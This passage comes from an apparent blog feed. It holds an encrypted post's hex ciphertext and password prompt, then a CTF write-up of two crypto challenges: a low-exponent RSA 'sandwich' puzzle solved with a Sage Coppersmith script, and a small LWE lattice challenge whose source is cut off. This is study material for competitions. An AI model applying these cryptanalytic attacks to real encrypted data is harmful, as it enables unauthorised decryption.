6948a9cab69e3584e029009aec9df64606fdc9acff521e1417151d210eda0481a2d121237aca252948367784fcf18b01dda6b061f912e96b562d7297c0b07662d91218fcb70c224ee37154e8616487d1da3f932dbd45fd9d9af4d8401597ed24c05f2714abb694141d2cf2c8490dbde3087922a7ca6bded8682dc1d4936de5dd8fa4f92bf6b9a59b0662d07bdb4e899015bdbd9788369da69b3b6d7fd25ee7d650abea7a4fbbea5735bf29ff7a8a0dc4c5afdb4a75b8b84b208ce2c13bd1ffc0b5ca97b8b1d2d975a281f78c7bea681a18b93c7a987d3cbea6df26bc311d63e2e0b07aae28f0ef6d305f103584a3aec8faba09ce3179e2b43f564e873a43b9271eaa781ebe89bca3283781ca056585224b26bbe22d0bfee060d86931b0db18888342e2384b69cb627c42d4d316f9d12aa178cc9af9c81af4ea2f825a997bea13b5d2a984b990e7de235affe2b19a755782f25f886c40f924fb37b2036ab8fd170f00d1d5c9ebff4f9e7389bc089b77970988337d97e5c519e9470c2bf93ce0a965a319b640a2171c7de322a6326fcec7eab1bb2b4ff8867f9a3d617ab03748deffb349a3b38ec1359a1a13f5e6dc01ae73c05b4608ea1f21bcbd03936ece3479a07c6c9f7a85e49509f1e904427a93f6006213036b73bf3c35d84da27d6039591198018841d6511d44fa70d3c1b264a090acf9b17d09b04fd18fa2356d522bdfe731a9decff069a9dfec50f8bdb53ff5e29d1f70392090b1e11da983805b1feab5dda44c0bb045a2079e60a84b4ceb34e123ecdda50396bf6543b6cc2a6a0699e60ddbb9dd94ed10eab64b1d77a69a589d04e3831255658b4890be5a27be5e0b4a3378139b5ff950bbd10bee161539b2b6922f97cf55ddb9d4553ff5e0dbf25bfe66d3e1dccdc44a591421670f0729a366dd3fe718889ba00b7ce2b8e2f3a44f01ec50e855041e9c2e2f935b357292f1b7b2fb91db827cbb6e9eb9db69d34f3d9495aa75e00c85909d239e710a1ff8b6c1a2979aa68658d5a6945cd877cb0808b934602bc13aa7565e0ca940307b777a40cbac77329fc96532aaf593ae0ce468a84bb078e8c1ec2ec27da6e9a389165e86f060e4b972bc992550a0f7b7e3cea984018f8588a19390c8613bcac63cb0f8fcd7c5c6bfc11ceeeedced9b22746ed6b82946f00b31fb1e2a93b580ab2b0bd25da2d6b966991f97afa2ec525ea9d3e38c7e10ba61fefcaf1088be34b91b8198880ea26f31a6a456f20a9708a181b477b70bbe7fc6da6446b349f9b294f2e617d448426bda30bb8b6489426cc9b53c74490100cf2ef9f6d8838f7a51c319a289671dd4c25cac829d4927041a83588a6175218fce0eff48e900433427e234ebd151290f689c69703b1e1b517895b32c7e678cae443184792c1d34c7cffa1d4a268a612b53e8a7cab0c97743f7be429a8abba02eef0921206a6dd02b6a2af4b306fdb66106a556fd384ea401409b10ea046387d1218f4788dd66b8c508ad4ea5d62a1a8ec3f523275e64d91ffba68f4decdc5bc4ac39844591df8b58235b2456502a614bcf44952853d5c73c2645066fb85c2b6236da426a6badcb002af69be83da45e17c9dcd2aae0415b81557733cc5b1c969970397bca27f44b23d9b00e1a9011e092bc58d55454d455b458761cfd0fb581f0fd02924d6cbc62a03277678d69548177a25957f3446dd421c710959410f5b9b347743de733bfc4b89006677e187f8373fa593197324abc96157cbd75470422763b51e9212febbd1238eaa5d9bfa2889831cdb454825f18b7b5463544e54ce6bcac96fd6d09948e4650e49e4a2318734f92940b7fe38f488f39cfc4e006194413afb14999379f0cb7e0ec1ac16c9f8bbf2b2a48ba2cabb7352b9ce5ad2fdc7e99a4c3f5f5d796e08587aca5e053ff391c6d44f79879d2afe28a02be248a0520530c3627f2b385518107a8254659d4f7550d930c2f0998762a4ac8e85f4933d56b13a7b19b57362897f9310f1deb386e2a93736ceba9e82622e8c92528ccaa9e08311e406e359c2942a0ad15b140cde12b2c745326e33270d62d67bf932388f1add8e3d6f8d50bce3df9811a1a8ba03c26a8859a23a00f3c950127518c0a703e2808ef59627624931a0f9defd674a052ff9c2613073c14ce227a60e3501359d50dc40594cafbd423a308874e6c3cf573cb942456678d7a4444c33056904e2d51da49b839de9f385678671d48f5600b7287ad78b67dbbea03f0a57bd4b196169542615c8eaaa3f00e0d2c482ab3a9d875c0eb64ec6d4a1acfe753345158e665dc9213fb3d46425120e562f18ee721f65ad13fbbfe6b41faab8cc068db63e407074674e2395b8eb1de0209910650569724f9d3fa9d720887b2235833a9742b25139a03796a0061ec196903a2d5d29267b3d44393ed721757fb2cf35529dbf54ffbb03d2ba4dde06c002fb6651ff4bcf4f1f4067188e94570650df1b4ad053cec780c727702d9fbbf500ad436345b6b11a0293cdd0a35df6040c524319bb731c55491bbb8ab14a777feb068f320261a90020015acb9b53daa714776a2b7462c60e8caff96444c806dd0a0ea5c31969d3c22e9ae5764716a97b934d6b189dfdb4e77748ab08a3689ac5f8895298ecfeaeb42ed2d9677bda2be0a1de6d20adcd79c1415edae8e040521b0186c9892a95c80e6703bcdfd7cee1b17cb4b224d2a8d122b0fae24b24f899c471c543b3c0f6a4e2a256fd10a2a08dc6bf8ad4fb30028942c0beb312effc04b6e794a8f8a8ffac8970d96c483e49dc8ff26eb80f1813b01f7d9e07721e18e782cc9baf8aa715d6e49fe146a293cb81500fbff6f5d62517c0c341d1efb5001c33d44286a1406e2f00bca0a74003225a0af2f0627b7c3c7c574c8265c9ad999fabb9aab41703362b70cbcff6e1f8da9bccd0fa8e8a9a76bcdccaf30113777e787011c30b87c5c7a3dc3ccedb6f328e58bb1fc3f12b4abb3b2583fca3397edfe37df372343066711e65c00fc4ce5a29221a21f87bddc64702646a790d9b553ced7da3e78543dff2a1d7760adf23f57c6fd8339056cc7364a8d00100edfe3dbe8c085838ba72df8552a048d50c105433f0df2724f646e8e77893c541e7ed80b4816254b865ff19b39380c23f1b7b05032f99af03f118f42db9715cacfbb3ab48772f8dc848a11ebd3e21c8517e4b1ecaf7bbb3bd4a358b5400e97eed84d71d2e0f6af85747a6142a1a914ff70fb218705a073ca4498e6cbb4d85daf41740992e589d489243891e6183ad9909720e56e339af7b90c17832433ec77a79df5c23ee867bb63d6e2b5bb26557e38f3636f0c9297088c878efe9f9bbfa9382eb2dd4bf489651fa102eb5461cb285af40d5d35158929c0e82753351d88ad3d2c81bda27fe66c6d646397d80093a0f907769122da8be04369b9917fe7271c595849002b740707a13b3ad73cadb868b0517490418ec2d6731e66dee7987e566f2772b91444ff7cd7e3cc116fe54933b2e88865f756ba6cc7f38f9689881336eaa491e0536ed132f5960593b06fc8f1b23009af201dca7d473ce35b7bf1fb777cf8276dd250bf5f9456964f2a44fcb449c81a95b00aadaf6cf01c4283363b2d6c99c8c35eb7c60095ed0d7c21f270da5affca0c5537ecaa972c6b1a15da85cd76787dc44f0df4dd3d3b717757937f256c2625a6c4dd0578196615ccbef708c3ff8b5c895a68b262b69ed1ebbbf778c5fdf8172e25e7ca28ecf82f52801cd9613945dbcdb377ca656675abcc1108faba54146bcef20a117f6bb392e6f586362d3d7df1d7cc46fd4d86a6b7981d2fd17dbbcb2ba8b928f7498229f475a75b7b72fa81fce7f9efbdd2b703f9d95c19f990cbd3886f03462eecb9e683366fa83bfef56527a49162989990ce903d81922063eda4e997cd3453c9acdb653210db8313917400f6b99b9786a0da8e16a600e1e9728b77ecb80dfad352b7b1d481ad8f263dc789429cead933a5749e2d7b04496048fdc18433986d2f42acb7d9e53def1c54e8452480aff3a7fd4ab07067d50f3c5a2bf76769c6235b851f616ccdba0ac0547c74bf4055d4b8457045cf7e64996c1406bdea13435ef2a59d9c294c489a12fa68c0658cbc9d5e4ece996d0d796a429730c7291c8bd82d43d639a415c5596f8e082c5ecf5a80f1ffbe6d788e80859911e0cffab0fb659da6a1fda9579eaf431f1706d7cf38e3e9308f5b5d01b62bd5bf5042bd6c9bb815c3de16d4335ff037847283d9230abbe10154bd228406cf032f935d8176a4d75a315d01e2391bb3aa9d265da1f96514443c2d8a7f9b573e4f28eead55d3181946a8ad891011ed1d079bb6e00463902202bbdb4857724fc35b13a87b6d20ce76b9052bbd620d53f839987bc87c37134b9c7568388a0eed98fd1b067c28bfe69a67c9cacd6e79629adbe583364bc19cf56c690306292df515e329fd7d98c99edd1d29f3be03de6db5d645f59fe1c25664ed42f622ad986177a9fdcb50da3f09943fa8f966ad84a72e20163bbacd0c133f48525f59b310fb512e1f52978076ae4beac3882feb3594a07c5301772b90709ca9000c1747ac9d980fb438f3b8ad69988d9b10fe8746290de7fa8570ffbae3d687b57426f3755374692a33414a735676a0cc7b4b9b70f4dfbe289f4953dfb01f09b9d76d332df6d142ce20f01f4014bd9cae1f976d47186579af5fdee3a32a14b363393fab0321c3582dc4893abdb486a095e714bd0aa7f0a6d001cb07b8321fc51b129a195ec0644765a71d17ed65e6872af0deb20cf5c8e794f265ec308a9bf5bc716fb1e1aa3e4bd9cb88aba01db10d52feff06fc524256105e799c806f9464d8a3b38ea61adfcfee496d3c05bc5699a011f1d3a44e60aba96b4ebad066b0f2a09a431906242da459997d75dd6c2318aeb9693911996f2ce84edf230ddfefb6f906e766cec05aaf85fc015dc0277efd01c204e7bf75b59f2eb76ee31fc280bb9e01b3a67e92c4c3c205b9352740e53548c2b3e75a4a2c76af5a630dd5a957ad5abea9ed52f955a8054663186eb7895fcd4753a1e3e29a37629f440ba1d8448360243791d26e1c1700f0635fea9c3583af83fe8ad95b95774d79b7bbd4f20318470a7f3320888a22d761a20ba538a72f2b865ed92ca4dfb24d2c12ed96430320e4ab4b29cb61fdd110fdd536a5af355b5b4c97a0da349e519b022d2bfd957bbaa810ab43fd0cdda37cc7a5fa28e42c75c02e1a99a74ec943d75fa7191fc9c34e67843956389394ed281d0e6ea759fb0f6e1c0b4ef263e2860600b3ef27436f6ac6a424efef83846dfcc302e4829938eb2f237c9af3ccd6f7ac69fe737af4ca06cd7f2dd54178f06ea214cde2a05b706b57cb1a8f8013bc5c864b4f5dc539bf175f0c1cd926e15d743093c5e4274c11e66da76edc7b09adf05a58f77f03c1b2bd80186d4a7ce953913a9cc3f23afee07812d4d71715d04ed71549dd3cda5bf72c870a71b74f80833129544136e53f0a7665020b07598355ecfd6e71b3cf841c9a8078a7c65af6f9c90ebc3b202174b31d5b9dd5426d25f18cf355148fb1d21f4059b2c8b922e25733a07401ef7e1c55269efc328fb758e0d95c00770a003c196a2876de3002d382398fdebbbc798660a19002a2efae3da21b3030d64f1c3903dc5d5d57be61566a63e188d748460681d88bfb54ff0820af54109d2f6759480e47d27e8026bbc77e7261c3b928ab42626e117cb46f30010585312844753c1ca172ee1964b778f74a923264fa3b435150e3411ee9c96ccbd8e04fd0f46a762643958bfd547e3ce4398a1ec2c157115da61ad9daafd445d4b531eee597d14f180e84c525fffc40c7116f5481d1e45b499c630992b388cea992f5705af97a6194a8e2179a65c9c0dfdfe9c712e46b96ad9ea7601c8da345438f3be27f5fd3bede93ecf9adee5c2e669a6624f0557c802b13dff0b9afb657edc9a36d1bc397d52a294ce85c822dbcd5daeefe303f5fe060eabc56b3f881ae21eb71738f39247dddde303fc490b942750ebab0f1ec61b8fc1c9fd5ab9f3e2ca2606d16d2be1b4476e927e7b7316590a2f112a730ab9989634aa10e554bce3f627f84f38d151c7eec04304d984fc2c2f55b1ee1329473dd52ee16204d1dfce6a735a4cf2622c402c509cd944d7c26b4c1c1340a9e9ff98757d4dd46cf17ab52395a691ef7f5b2988d9c6a455903a08f75576dc851a06091b6eedb9bdd6d28d59516ed05a9cc85e6b90b872e3a514ec42c453708dbaf0f6a781582d8d5c2d781742037da8f69917e8efe903a5ba7bd76151976cc0747fb4b97af81dbf9bf479ef69cb19e86d020cb7c809e2a03efa476875eaea74cd57f1ef728e1ffaad9dbcf5d159115f9f477d013a52c79e03e2adaae126dfdab53407bb66c996e3efa81fd506e498234e41f2961e8205961cd6c57316bd6666459b1e3c13347ca4141a6ceeae32a435efc049874321e44b2e0c87fbc25a554a60775dc6b05475becc0e68455b6e8d92e581714af0e392281aece6d243fb47385d9d8169924eff62f2ff56eefcc9dda948b1819b5355942a6099f6820518d750a7c731fd03064b833ae4f0dcdd1fa5db71a703d065a20e9a3cf53be037e024a05b27246b460eb3fa56198a510a00e2c6d8bac261ca0026300976d65bafb434d5ab7f4ff762c2879c0a6eb88cc6a845729b10b39bf712b69e8ef5c59b63d1fa405d1d8d8d5fabe81703f10aff5fce85fdaa50060cf71352a08f84bb27916cf86ad3245963081ca2cc414d0c20b4c1949f00e23495a7d1297ae87d15aa4e19a2dd066794903966d34932c39778ab4c304a0bdbb8c41c646f2b24f1c64f264a6baedc79013d779905f39212e6c880a40ecc443d9313399a6274c305df0eb88f45ae343f160fceed2c3b2f39aea99e9e979b13804377c94be715d0518a67efc9c5dc1d76581c110afc75ab2cd950d2a2dbb840263dbf9052929d342fcf1ce3c3c2093b39076c9040829c061a3adb1d6931d477f57e4fcb2f41b1a50213d54ce550cebf81908a40550713cc300dee066123d4e18aea031e043c4bf417d498206a1bc7620797be105ae9fc8c18fd0636b12dd92004ebfab24aaa7ab783ef6836861188fbdf8828d8181c09a6122935089ed2467f9ee7f5265456d8f8f8ad48ea530ab9d7bee9eb34d8f1f767fbc4a18ec9053bb4b18c8f4fbdc045e94de4be4a50ed31b43d02fee8f1a06cf3d16fe37abc3cc0d4ca46d63f85aeb50fe78e7d5cbe1b1cee97fc51852d6a3a2533251e8c640cd790f5722c957e840f05321c8670783be18474f8e5fd2c840363e33b347bb73f3c9855dec82958e46d99d112020905e99567f3b430b5de14a756eb59bec7a924db984752f660acc4485d0e4383b60b1db55722a59e98d2c9aa02d8a554a4ba48d421481d60f1f65ec2256127735846157062a47f1b05ec47f59aae6558d6f3286c3aaf3af5c75d064ea5e97394c142cbca422ba3dd0b1da4f7fff48ba959c0e77de862e4af807cd98873ada26a08d5e87fb50a7725a37c3751e650dbd51607f914aba9115e4de3d481a65c4d2ee7d8aae91846d86dcd618124c0d2e8e98acd6c3a89727bc766c1b8f9dce95af70f001b82bd8d24e1250c312615682bb299083ff84834b0ecacd4cb3f13ecae8d9765d4e1e946bdc2a0afd214671b08d6794dff0aacfaef3f0ba2bf885d99f26ff8c9da31bf0dc528f5c652fcbe40af472a146e23a280e60cc75183345f3070a822ba73a212e9be228c4dc0640c423bbcfa71e034e4c7305e5a0c81db9e627f436490d0fb8f74170fbfd8c635da0ca58cf9b86c2c3c987f0badedcc15899c2dded597b241f311c2382686886c61587636b493ed85a136773ee304b4c583d55e5435690544185d9678534d9500fa6ddaad7bbe651603a80805e6fd9855eefe07a0ace40da40ce6c289fdcc9e0f6911ad7370d121beeb79f0fc9c2df589ef2546b4d7a6e213aad934ca363ede251d8d0b08d88a23da9fdff7143a6d25cf56e32e74b272a878150b9dda062a7bf6a326a14640b7a955c5eec1c68b5cadd6689849c01f3cfbc4f605b3283c21b682fe72846ee434a66d56efdfaae5cdc44355214fb3e0f00b8f20203aa2ab889cb3124aa598efa2dd2355812184c394ef7b31fd6dbeae837161f6bf2cc5c71c503c771f5eb9484ac37d9a13f04279e13183dad2c74e2c60f1c401adef7ecd4d82df81545124e1ff3275bf32f6ccae4349b3fef95b80ab41b5ea6a6f36cb3</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">没有密码怎么能看呢</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">pickle反序列化的时候应该挺有用的吧</summary>
    
    
    
    <category term="talk" scheme="https://baozongwi.xyz/categories/talk/"/>
    
    
    <category term="sanic" scheme="https://baozongwi.xyz/tags/sanic/"/>
    
  </entry>
  
  <entry>
    <title>第三届黄河流域网络安全技能挑战赛</title>
    <link href="https://baozongwi.xyz/posts/5d4326a2.html"/>
    <id>https://baozongwi.xyz/posts/5d4326a2.html</id>
    <published>2025-05-24T03:18:02.000Z</published>
    <updated>2025-08-08T04:18:46.491Z</updated>
    
    <content type="html"><![CDATA[<h2 id="sandwitch"><a href="#sandwitch" class="headerlink" title="sandwitch"></a>sandwitch</h2><p>三明治攻击，把题目和名字都给DeepSeek，并且LLM指导进行爆破得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">flag = <span class="string">b&#x27;flag&#123;fake_flag&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">39</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x3</span></span><br><span class="line">pad1 = <span class="string">b&#x27;easy_problem&#x27;</span></span><br><span class="line">pad2 = <span class="string">b&#x27;How_to_solve_it&#x27;</span></span><br><span class="line">c = <span class="built_in">pow</span>(bytes_to_long(pad1 + flag + pad2),e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199</span></span><br><span class="line"><span class="string">c = 58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">130210658110511504736422597261591182174531847806532340762131145212035478695205314931974421838392310731226415266775095601890938846830080329061111533796518633011922277343217149648494987341818402753017296362015915834670450122261511337212801488239810623226740266516836721952886027130703886460578247562781194524199</span></span><br><span class="line">c = <span class="number">58274335440051115211211273605191310114692293785750437685473044454042062899661976407492451518086227780147882738264722645944582899451063113444881286175099872016956825274378613983870549046907444680021237171113596116147511706486372974792692071549068969896395366667516390709069131700584308236332248449116109156503</span></span><br><span class="line"></span><br><span class="line">pad1 = <span class="string">b&#x27;easy_problem&#x27;</span>    <span class="comment"># 12字节</span></span><br><span class="line">pad2 = <span class="string">b&#x27;How_to_solve_it&#x27;</span> <span class="comment"># 15字节</span></span><br><span class="line"></span><br><span class="line">A = bytes_to_long(pad1)</span><br><span class="line">B = bytes_to_long(pad2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ------------------ 关键验证点 -------------------</span></span><br><span class="line"><span class="comment"># 1. 确认填充长度</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(pad1) == <span class="number">12</span> <span class="keyword">and</span> <span class="built_in">len</span>(pad2) == <span class="number">15</span>, <span class="string">&quot;填充长度错误&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 计算位移</span></span><br><span class="line">total_shift_pad1 = (<span class="number">39</span> + <span class="built_in">len</span>(pad2)) * <span class="number">8</span>  <span class="comment"># (39+15)*8=432位</span></span><br><span class="line">shift_flag = <span class="built_in">len</span>(pad2) * <span class="number">8</span>               <span class="comment"># 15*8=120位</span></span><br><span class="line"><span class="keyword">assert</span> total_shift_pad1 == <span class="number">432</span> <span class="keyword">and</span> shift_flag == <span class="number">120</span>, <span class="string">&quot;位移计算错误&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 构造多项式</span></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">M = A * (<span class="number">2</span> ** total_shift_pad1) + x * (<span class="number">2</span> ** shift_flag) + B</span><br><span class="line">f = (M**<span class="number">3</span> - c).monic()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 自动化参数遍历</span></span><br><span class="line">success = <span class="literal">False</span></span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> [<span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]:                  <span class="comment"># 遍历不同格维度</span></span><br><span class="line">    <span class="keyword">for</span> beta <span class="keyword">in</span> [<span class="number">0.4</span>, <span class="number">0.45</span>, <span class="number">0.5</span>]:       <span class="comment"># 不同beta值</span></span><br><span class="line">        <span class="keyword">for</span> epsilon <span class="keyword">in</span> [<span class="number">0.01</span>, <span class="number">0.02</span>, <span class="number">0.05</span>]: <span class="comment"># 不同epsilon</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n尝试参数: m=<span class="subst">&#123;m&#125;</span>, beta=<span class="subst">&#123;beta&#125;</span>, epsilon=<span class="subst">&#123;epsilon&#125;</span>&quot;</span>)</span><br><span class="line">            roots = f.small_roots(X=<span class="number">2</span>**(<span class="number">39</span>*<span class="number">8</span>), beta=beta, epsilon=epsilon, m=m)</span><br><span class="line">            <span class="keyword">if</span> roots:</span><br><span class="line">                flag = long_to_bytes(<span class="built_in">int</span>(roots[<span class="number">0</span>]))</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] 成功恢复Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                success = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] 当前参数组合未找到根&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> success: <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> success: <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n[!] 所有参数组合均失败，请检查：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    1. 填充结构是否与题目完全一致&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    2. 确认n和c的值正确&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    3. 尝试更高性能设备运行（增大m需要更多内存）&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-140803.jpg" alt="1"></p><p><img src="/../images/achieve/2025/5/%E7%AC%AC%E4%B8%89%E5%B1%8A%E9%BB%84%E6%B2%B3%E6%B5%81%E5%9F%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%8A%80%E8%83%BD%E6%8C%91%E6%88%98%E8%B5%9B/QQ20250524-140821.jpg" alt="1"></p><h2 id="Lattice"><a href="#Lattice" class="headerlink" title="Lattice"></a>Lattice</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen</span>(<span class="params">q, n, N, sigma</span>):</span><br><span class="line">    t = np.random.randint(<span class="number">0</span>, high=q // <span class="number">2</span>, size=n)</span><br><span class="line">    s = np.concatenate([np.ones(<span class="number">1</span>, dtype=np.int32), t])</span><br><span class="line">    A = np.random.randint(<span class="number">0</span>, high=q // <span class="number">2</span>, size=(N, n))</span><br><span class="line">    e = np.<span class="built_in">round</span>(np.random.randn(N) * sigma**<span class="number">2</span>).astype(np.int32) % q</span><br><span class="line">    b = ((np.dot(A, t) + e).reshape(-<span class="number">1</span>, <span class="number">1</span>)) % q</span><br><span class="line">    P = np.hstack([b, -A])</span><br><span class="line">    <span class="keyword">return</span> P, s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">P, M, q</span>):</span><br><span class="line">    N = P.shape[<span class="number">0</span>]</span><br><span class="line">    n = <span class="built_in">len</span>(M)</span><br><span class="line">    r = np.random.randint(<span class="number">0</span>, <span class="number">2</span>, (n, N))</span><br><span class="line">    Z = np.zeros((n, P.shape[<span class="number">1</span>]), dtype=np.int32)</span><br><span class="line">    Z[:, <span class="number">0</span>] = <span class="number">1</span></span><br><span class="line">    C = np.zeros((n, P.shape[<span class="number">1</span>]), dtype=np.int32)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        C[i] = (np.dot(P.T, r[i]) + (np.floor(q / <span class="number">2</span>) * Z[i] * M[i])) % q</span><br><span class="line">    <span class="keyword">return</span> C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">q = <span class="number">127</span></span><br><span class="line">n = <span class="number">3</span></span><br><span class="line">N = <span class="built_in">int</span>(<span class="number">1.1</span> * n * np.log(q))</span><br><span class="line">sigma = <span class="number">1.0</span></span><br><span class="line"></span><br><span class="line">P, s = gen(q, n, N, sigma)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">prep</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="keyword">return</span> np.array([<span class="built_in">int</span>(b) <span class="keyword">for</span> char <span class="keyword">in</span> s <span class="keyword">for</span> b <span class="keyword">in</span> <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">ord</span>(char):08b&#125;</span>&quot;</span>], dtype=np.int32)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">C = enc(P, prep(hint), q)</span><br><span class="line">P = P.tolist()</span><br><span class="line">C = C.tolist()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;P=&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span 